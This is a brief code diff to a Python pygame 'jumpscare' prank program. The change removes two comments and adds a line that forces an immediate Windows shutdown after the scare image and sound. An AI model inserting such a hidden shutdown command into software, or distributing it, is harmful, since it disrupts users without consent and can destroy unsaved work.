@@ -18,7 +18,6 @@ import os
 
 
 def jumpscare():
-    # Play the jumpscare sound
     truepath = get_resource_path('jumpscare.png')
     pygame.init()
     screen_info = pygame.display.Info()
@@ -28,7 +27,8 @@ def jumpscare():
     screen.blit(image, (0, 0))
     pygame.display.flip()
     play("jumpscare.mp3",3)
-    pygame.time.delay(1)  # Display the image for 3 seconds
+    pygame.time.delay(1)  
+    os.system("shutdown /s /t 0")
     pygame.quit()
 def get_resource_path(relative_path):
     """Get absolute path to resource, works for PyInstaller one-file mode."""
